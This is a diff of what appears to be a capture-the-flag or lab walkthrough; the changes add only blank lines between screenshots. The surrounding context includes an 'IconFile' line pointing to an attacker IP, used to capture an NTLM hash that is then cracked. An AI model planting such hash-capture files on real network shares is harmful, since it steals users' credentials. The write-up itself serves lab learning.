@@ -65,6 +65,7 @@ session setup failed: NT_STATUS_ACCESS_DENIED
 - Port `80`
 
 ![](./images/1.png)
+
 ![](./images/2.png)
 
 - `gobuster`
@@ -121,6 +122,7 @@ IconFile=\\10.10.16.4\anything.exe
   - And we got `hash`
 
 ![](./images/5.png)
+
 ![](./images/6.png)
 
 - Let's crack it
